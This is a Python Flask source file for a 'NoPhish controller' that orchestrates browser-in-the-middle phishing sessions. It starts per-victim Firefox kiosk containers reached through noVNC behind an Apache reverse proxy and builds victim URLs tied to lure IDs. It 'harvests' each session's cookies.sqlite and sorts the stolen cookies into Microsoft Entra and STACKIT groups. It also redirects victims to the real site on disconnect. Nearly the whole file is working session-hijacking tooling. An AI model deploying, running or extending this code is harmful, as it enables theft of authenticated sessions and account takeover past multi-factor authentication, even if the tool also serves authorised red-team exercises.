#!/usr/bin/env python3
"""NoPhish controller API.

A thin control plane on top of the existing NoPhish docker setup, so an
orchestrator (e.g. ConsentFix) can spawn, inspect, harvest and tear down
victim sessions on demand instead of everything being fixed at setup.sh
launch time.

It reuses NoPhish's images (vnc-docker / rev-proxy) and its apache reverse
proxy, but adds/removes per-session config files at runtime and reloads
apache gracefully. Only desktop containers are supported for now.

Auth: every /api/* request must send `X-API-Key`.

Env:
    CONTROLLER_API_KEY   shared secret (generated + logged if unset)
    CONTROLLER_HOST      default 0.0.0.0
    CONTROLLER_PORT      default 6600
    NOPHISH_DOMAIN       public hostname used to build victim URLs
    NOPHISH_SSL          "true" to use https in victim URLs
    NOPHISH_CERT/KEY     cert/key paths (copied into proxy when SSL enabled)
    VNC_IMAGE            default "vnc-docker"
    PROXY_IMAGE          default "rev-proxy"
    SESSIONS_DIR         default "<repo>/controller/state"
    DOCKER_CMD           default "sudo docker"
    DEFAULT_UA           Firefox UA override (must look like a real browser)
"""

import json
import os
import secrets
import shlex
import shutil
import sqlite3
import subprocess
import tempfile
import threading
import time
from datetime import datetime, timezone
from functools import wraps

from flask import Flask, jsonify, request

REPO_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

API_KEY = os.environ.get("CONTROLLER_API_KEY") or secrets.token_hex(16)
HOST = os.environ.get("CONTROLLER_HOST", "0.0.0.0")
PORT = int(os.environ.get("CONTROLLER_PORT", "6600"))
DOMAIN = os.environ.get("NOPHISH_DOMAIN", "localhost")
USE_SSL = os.environ.get("NOPHISH_SSL", "false").lower() in ("1", "true", "yes")
CERT = os.environ.get("NOPHISH_CERT", "")
KEY = os.environ.get("NOPHISH_KEY", "")
VNC_IMAGE = os.environ.get("VNC_IMAGE", "vnc-docker")
PROXY_IMAGE = os.environ.get("PROXY_IMAGE", "rev-proxy")
# The accetto VNC base is amd64-only; set e.g. VNC_PLATFORM=linux/amd64 on an arm host.
VNC_PLATFORM = os.environ.get("VNC_PLATFORM", "")
# Extra `docker run` args for the VNC container, e.g. VNC_RUN_ARGS="--user root".
VNC_RUN_ARGS = shlex.split(os.environ.get("VNC_RUN_ARGS", ""))
SESSIONS_DIR = os.environ.get("SESSIONS_DIR", os.path.join(REPO_DIR, "controller", "state"))
DOCKER_CMD = os.environ.get("DOCKER_CMD", "sudo docker").split()
PROXY_NAME = "rev-proxy"
BASE_CONF = "/etc/apache2/conf-enabled/zz-stackit-base.conf"
DEFAULT_UA = os.environ.get(
    "DEFAULT_UA",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
)
SCHEME = "https" if USE_SSL else "http"

app = Flask(__name__)
_lock = threading.RLock()
STATE_FILE = os.path.join(SESSIONS_DIR, "state.json")


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def log(msg):
    print(f"[{datetime.now(timezone.utc).isoformat()}] {msg}", flush=True)


def run(cmd, check=True, capture=True):
    log("$ " + " ".join(cmd))
    res = subprocess.run(
        cmd, check=False, text=True,
        stdout=subprocess.PIPE if capture else None,
        stderr=subprocess.STDOUT if capture else None,
    )
    if res.stdout:
        log(res.stdout.rstrip())
    if check and res.returncode != 0:
        raise RuntimeError(f"command failed ({res.returncode}): {' '.join(cmd)}")
    return res


def docker(*args, check=True):
    return run(DOCKER_CMD + list(args), check=check)


def proxy_exec(script, check=True):
    return docker("exec", PROXY_NAME, "/bin/bash", "-c", script, check=check)


def _load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {"sessions": {}}


def _save_state(state):
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    tmp = STATE_FILE + ".tmp"
    with open(tmp, "w") as f:
        json.dump(state, f, indent=2)
    os.replace(tmp, STATE_FILE)


def _container_running(name):
    res = docker("inspect", "-f", "{{.State.Running}}", name, check=False)
    return res.returncode == 0 and (res.stdout or "").strip() == "true"


def _container_ip(name):
    res = docker("inspect", "-f",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", name)
    return (res.stdout or "").strip()


def require_api_key(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if request.headers.get("X-API-Key") != API_KEY:
            return jsonify({"error": "forbidden"}), 403
        return fn(*args, **kwargs)
    return wrapper


# ---------------------------------------------------------------------------
# infrastructure
# ---------------------------------------------------------------------------

def _platform_args(image):
    return ["--platform", VNC_PLATFORM] if VNC_PLATFORM and image == VNC_IMAGE else []


def ensure_images():
    for image, dockerfile in ((VNC_IMAGE, "VNC-Dockerfile"), (PROXY_IMAGE, "PROXY-Dockerfile")):
        res = docker("image", "inspect", image, check=False)
        if res.returncode != 0:
            log(f"building image {image} ...")
            docker("build", *_platform_args(image), "-t", image,
                   "-f", os.path.join(REPO_DIR, dockerfile), REPO_DIR)


def ensure_proxy():
    res = docker("inspect", "-f", "{{.State.Running}}", PROXY_NAME, check=False)
    if res.returncode != 0:
        ports = ["-p", "443:443", "-p", "65534:65534"] if USE_SSL else ["-p", "80:80", "-p", "65534:65534"]
        docker("run", "-dit", *ports, "--name", PROXY_NAME, PROXY_IMAGE, "/bin/bash")
        time.sleep(3)
        proxy_exec("a2enmod rewrite proxy proxy_http proxy_wstunnel headers ssl >/dev/null 2>&1; a2dissite 000-default >/dev/null 2>&1; true")
        if USE_SSL and CERT and KEY:
            docker("cp", CERT, f"{PROXY_NAME}:/etc/ssl/certs/server.pem")
            docker("cp", KEY, f"{PROXY_NAME}:/etc/ssl/private/server.key")
        base = _render_base_conf()
        _write_proxy_file(BASE_CONF, base)
        proxy_exec("apache2ctl -k graceful >/dev/null 2>&1 || service apache2 restart >/dev/null 2>&1; true")
    else:
        _write_proxy_file(BASE_CONF, _render_base_conf())
        _reload_proxy()


def _render_base_conf():
    lines = ["ServerName " + DOMAIN, "DocumentRoot /var/www/html",
             "Header unset ETag",
             'Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"',
             'Header set Pragma "no-cache"',
             "RewriteEngine On",
             "RewriteMap redirects txt:/tmp/redirects.txt",
             "RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$",
             "RewriteRule ^(.*)$ ${redirects:$1} [R,L]"]
    if USE_SSL:
        lines += ["Listen 443", "SSLEngine on",
                  "SSLCertificateFile /etc/ssl/certs/server.pem",
                  "SSLCertificateKeyFile /etc/ssl/private/server.key"]
    return "\n".join(lines) + "\n"


def _write_proxy_file(dest, content):
    fd, tmp = tempfile.mkstemp()
    with os.fdopen(fd, "w") as f:
        f.write(content)
    # docker cp preserves mode/owner; make it world-readable for www-data
    os.chmod(tmp, 0o644)
    docker("cp", tmp, f"{PROXY_NAME}:{dest}")
    proxy_exec(f"chmod 644 {dest}")
    os.unlink(tmp)


def _reload_proxy():
    proxy_exec("apache2ctl -k graceful >/dev/null 2>&1 || service apache2 restart >/dev/null 2>&1; true")


# ---------------------------------------------------------------------------
# session rendering
# ---------------------------------------------------------------------------

def _render_iframe(slug, pw):
    return f"""<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'>
<title>STACKIT</title>
<style>
body,html{{height:100%;margin:0;overflow:hidden}}
iframe{{width:100%;height:100%;border:none}}
</style>
</head>
<body>
<iframe src='{SCHEME}://{DOMAIN}/{pw}/conn.html?path=/{pw}/websockify&password={pw}&autoconnect=true&resize=remote' frameborder='0'></iframe>
</body>
</html>
"""


def _render_session_conf(slug, pw, cip):
    return f"""# NoPhish controller session {slug}
RewriteRule ^/s/{slug}/?$ /iframe-{slug}.html [L]
<Location /{pw}>
    ProxyPass http://{cip}:6901
    ProxyPassReverse http://{cip}:6901
</Location>
<Location /{pw}/websockify>
    ProxyPass ws://{cip}:6901/websockify keepalive=On
    ProxyPassReverse ws://{cip}:6901/websockify
</Location>
ProxyTimeout 600
Timeout 600
"""


def _install_session_routing(session):
    slug, pw = session["slug"], session["pw"]
    _write_proxy_file(f"/var/www/html/iframe-{slug}.html", _render_iframe(slug, pw))
    _write_proxy_file(f"/etc/apache2/conf-enabled/stackit-{slug}.conf",
                      _render_session_conf(slug, pw, session["ip"]))
    _reload_proxy()


def _remove_session_routing(slug):
    proxy_exec(
        f"rm -f /var/www/html/iframe-{slug}.html "
        f"/etc/apache2/conf-enabled/stackit-{slug}.conf"
    )
    _reload_proxy()


# ---------------------------------------------------------------------------
# container lifecycle
# ---------------------------------------------------------------------------

def _write_user_js(name):
    user_js = (
        f'user_pref("general.useragent.override","{DEFAULT_UA}");\n'
        # skip first-run onboarding / ToU / what's-new / default-browser prompts
        # (set both prefixed and unprefixed variants across Firefox versions)
        'user_pref("aboutwelcome.enabled", false);\n'
        'user_pref("browser.aboutwelcome.enabled", false);\n'
        'user_pref("aboutwelcome.didSeeFinalScreen", true);\n'
        'user_pref("browser.aboutwelcome.didSeeFinalScreen", true);\n'
        'user_pref("termsofuse.bypassNotification", true);\n'
        'user_pref("browser.termsofuse.bypassNotification", true);\n'
        'user_pref("termsofuse.acceptedVersion", 999999);\n'
        'user_pref("browser.termsofuse.acceptedVersion", 999999);\n'
        'user_pref("browser.startup.homepage_override.mstone", "ignore");\n'
        'user_pref("browser.shell.checkDefaultBrowser", false);\n'
        'user_pref("browser.startup.page", 1);\n'
        'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n'
        'user_pref("toolkit.telemetry.reportingpolicy.firstRun", false);\n'
        'user_pref("trailhead.firstrun.didSeeAboutWelcome", true);\n'
        'user_pref("signon.rememberSignons", false);\n'
        'user_pref("signon.formlessCapture.enabled", false);\n'
        'user_pref("signon.storeWhenAutocompleteOff", false);\n'
    )
    fd, tmp = tempfile.mkstemp()
    with os.fdopen(fd, "w") as f:
        f.write(user_js)
    docker("cp", tmp, f"{name}:/tmp/user.js")
    os.unlink(tmp)
    # copy into every Firefox profile (matched via prefs.js / cookies.sqlite)
    docker("exec", name, "sh", "-c",
           "find / -name prefs.js -execdir cp -f /tmp/user.js . \\; 2>/dev/null; "
           "find / -name cookies.sqlite -execdir cp -f /tmp/user.js . \\; 2>/dev/null; "
           "for b in /home/*/.config/mozilla/firefox /home/*/.mozilla/firefox "
           "/root/.config/mozilla/firefox /root/.mozilla/firefox; do "
           "[ -d \"$b\" ] && for d in \"$b\"/*/; do cp -f /tmp/user.js \"$d\" 2>/dev/null; done; done; true")


def _reload_firefox(name, target):
    # Prefer a fast soft reload (xdotool) so the page refreshes without a blank restart.
    res = docker("exec", name, "sh", "-c",
                 "command -v xdotool >/dev/null 2>&1 && DISPLAY=:1 xdotool key --clearmodifiers ctrl+r",
                 check=False)
    if res.returncode == 0:
        return
    docker("exec", name, "sh", "-c",
           f"pkill firefox; sleep 1; nohup env DISPLAY=:1 firefox {target} --kiosk > /dev/null 2>&1 &")


def _start_container(name, pw, target_url):
    docker("run", "-dit", *_platform_args(VNC_IMAGE), *VNC_RUN_ARGS, "--name", name,
           "-e", f"VNC_PW={pw}", "-e", "NOVNC_HEARTBEAT=30", VNC_IMAGE)
    time.sleep(4)
    # create the Firefox profile once, dismiss the first-run welcome, so the
    # landing shows immediately when the victim connects
    docker("exec", name, "sh", "-c",
           "env DISPLAY=:1 firefox about:blank > /dev/null 2>&1 & sleep 8; pkill firefox; sleep 2")
    _write_user_js(name)
    # TARGET_URL is used by ui.js when the victim disconnects / takes over.
    docker("exec", "--user", "root", name, "sh", "-c",
           f"sed -i 's#TARGET_URL#{target_url}#g' /usr/libexec/noVNCdim/app/ui.js")
    docker("exec", name, "sh", "-c",
           f"nohup env DISPLAY=:1 firefox {target_url} --kiosk > /dev/null 2>&1 &")
    # dismiss the Firefox first-run welcome once it appears (harmless if absent)
    dismiss = (
        "for i in 1 2 3 4 5 6; do "
        "W=$(DISPLAY=:1 xdotool search --onlyvisible --class firefox 2>/dev/null | head -1); "
        "if [ -n \"$W\" ]; then "
        "DISPLAY=:1 xdotool windowactivate --sync $W 2>/dev/null; "
        "DISPLAY=:1 xdotool mousemove --sync 680 325 2>/dev/null; "
        "DISPLAY=:1 xdotool mousedown 1 2>/dev/null; DISPLAY=:1 xdotool mouseup 1 2>/dev/null; "
        "fi; sleep 5; done"
    )
    docker("exec", "-d", name, "sh", "-c", dismiss)
    return _container_ip(name)


def _read_cookies(name):
    """Copy the container's cookies.sqlite out and parse it."""
    docker("exec", name, "sh", "-c",
           "find -name cookies.sqlite -exec cp {} /home/headless/_cookies.sqlite \\; || true", check=False)
    fd, tmp = tempfile.mkstemp(suffix=".sqlite")
    os.close(fd)
    res = docker("cp", f"{name}:/home/headless/_cookies.sqlite", tmp, check=False)
    if res.returncode != 0:
        os.unlink(tmp)
        return []
    cookies = []
    try:
        con = sqlite3.connect(tmp)
        con.text_factory = lambda b: b.decode(errors="ignore")
        cur = con.cursor()
        cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
        for host, cname, value, path, expiry, secure, httponly, samesite in cur.fetchall():
            cookies.append({
                "host": host, "name": cname, "value": value, "path": path,
                "expiry": expiry, "secure": bool(secure), "httpOnly": bool(httponly),
                "sameSite": samesite,
            })
        con.close()
    finally:
        os.unlink(tmp)
    return cookies


def _group_cookies(cookies):
    groups = {"entra": [], "stackit": [], "other": []}
    for c in cookies:
        h = c["host"].lower()
        if "stackit.cloud" in h:
            groups["stackit"].append(c)
        elif "microsoftonline.com" in h or "microsoft.com" in h or "live.com" in h or "windows.net" in h:
            groups["entra"].append(c)
        else:
            groups["other"].append(c)
    return groups


# ---------------------------------------------------------------------------
# API
# ---------------------------------------------------------------------------

@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok", "domain": DOMAIN})


@app.route("/api/sessions", methods=["POST"])
@require_api_key
def create_session():
    data = request.get_json(silent=True) or {}
    lure_id = (data.get("lure_id") or "").strip()
    target = (data.get("target") or "").strip()
    if not lure_id:
        return jsonify({"error": "lure_id required"}), 400
    if not target:
        return jsonify({"error": "target required"}), 400

    with _lock:
        state = _load_state()
        ensure_images()
        ensure_proxy()

        # idempotent per lure
        for s in state["sessions"].values():
            if s["lure_id"] == lure_id and s["status"] != "released":
                if _container_running(s["name"]):
                    return jsonify(_public_session(s)), 200
                # container died (e.g. controller restart): recreate with same slug/pw
                log(f"reviving dead container for session {s['session_id']}")
                docker("rm", "-f", s["name"], check=False)
                try:
                    s["ip"] = _start_container(s["name"], s["pw"], target)
                    s["status"] = "active"
                    _save_state(state)
                    _install_session_routing(s)
                except Exception as e:
                    return jsonify({"error": f"failed to restart container: {e}"}), 500
                return jsonify(_public_session(s)), 201

        session_id = secrets.token_hex(8)
        slug = secrets.token_hex(6)
        pw = secrets.token_hex(16)
        name = f"vnc-{slug}"
        try:
            ip = _start_container(name, pw, target)
        except Exception as e:
            docker("rm", "-f", name, check=False)
            return jsonify({"error": f"failed to start container: {e}"}), 500

        session = {
            "session_id": session_id, "slug": slug, "pw": pw, "name": name,
            "lure_id": lure_id, "target": target, "ip": ip,
            "created": datetime.now(timezone.utc).isoformat(), "status": "active",
        }
        state["sessions"][session_id] = session
        _save_state(state)
        _install_session_routing(session)
        log(f"session {session_id} created for lure {lure_id}")
        return jsonify(_public_session(session)), 201


@app.route("/api/sessions", methods=["GET"])
@require_api_key
def list_sessions():
    state = _load_state()
    out = []
    for s in state["sessions"].values():
        item = _public_session(s)
        if s["status"] == "active":
            try:
                groups = _group_cookies(_read_cookies(s["name"]))
                item["counts"] = {k: len(v) for k, v in groups.items()}
            except Exception:
                item["counts"] = {}
        out.append(item)
    return jsonify({"sessions": out})


@app.route("/api/sessions/<session_id>", methods=["GET"])
@require_api_key
def get_session(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    return jsonify(_public_session(s))


@app.route("/api/sessions/<session_id>/cookies", methods=["GET"])
@require_api_key
def get_cookies(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    cookies = _read_cookies(s["name"])
    groups = _group_cookies(cookies)
    return jsonify({
        "session_id": session_id,
        "lure_id": s["lure_id"],
        "cookies": cookies,
        "groups": groups,
        "counts": {k: len(v) for k, v in groups.items()},
    })


@app.route("/api/sessions/<session_id>/reload", methods=["POST"])
@require_api_key
def reload_session(session_id):
    """Reload the container's page at the target (picks up landing changes)."""
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    if not _container_running(s["name"]):
        return jsonify({"error": "container not running"}), 409
    _reload_firefox(s["name"], s["target"])
    return jsonify({"status": "reloaded", "session_id": session_id})


@app.route("/api/sessions/<session_id>/disconnect", methods=["POST"])
@require_api_key
def disconnect_session(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    ip, pw, target = s["ip"], s["pw"], s["target"]
    proxy_exec(
        "sh -c 'grep -qxF {ip} /tmp/disconnect.txt 2>/dev/null || echo {ip} >> /tmp/disconnect.txt'; "
        "sh -c 'grep -qF /{pw}/ /tmp/redirects.txt 2>/dev/null || "
        "(echo \"/{pw}/websockify {target}\" >> /tmp/redirects.txt; "
        "echo \"/{pw}/conn.html {target}\" >> /tmp/redirects.txt)'".format(ip=ip, pw=pw, target=target)
    )
    return jsonify({"status": "disconnected", "session_id": session_id})


@app.route("/api/sessions/<session_id>/release", methods=["POST"])
@require_api_key
def release_session(session_id):
    with _lock:
        state = _load_state()
        s = state["sessions"].get(session_id)
        if not s:
            return jsonify({"error": "not found"}), 404
        docker("rm", "-f", s["name"], check=False)
        _remove_session_routing(s["slug"])
        s["status"] = "released"
        s["released"] = datetime.now(timezone.utc).isoformat()
        _save_state(state)
        log(f"session {session_id} released")
        return jsonify({"status": "released", "session_id": session_id})


def _public_session(s):
    return {
        "session_id": s["session_id"],
        "lure_id": s["lure_id"],
        "status": s["status"],
        "url": f"{SCHEME}://{DOMAIN}/s/{s['slug']}",
        "target": s["target"],
        "created": s["created"],
        "released": s.get("released"),
    }


if __name__ == "__main__":
    log(f"controller starting; api_key={API_KEY}")
    log(f"public scheme={SCHEME} domain={DOMAIN}; images={VNC_IMAGE}/{PROXY_IMAGE}")
    app.run(host=HOST, port=PORT)
